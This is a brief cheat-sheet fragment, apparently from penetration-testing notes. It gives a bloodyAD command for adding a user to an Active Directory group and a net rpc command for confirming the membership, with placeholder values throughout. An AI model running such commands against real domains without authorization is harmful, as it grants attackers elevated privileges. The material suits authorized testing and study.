Add privileged user to target group:
```
bloodyAD --host '<ip>' -d '<domain FQDN>' -u <user> -p <password> add groupMember "<group>" "<user>"
```

## Check to see if it worked
```
net rpc group members "<group>" -U "<domain>"/"<username>"%"<password>" -S "<FQDN>"
```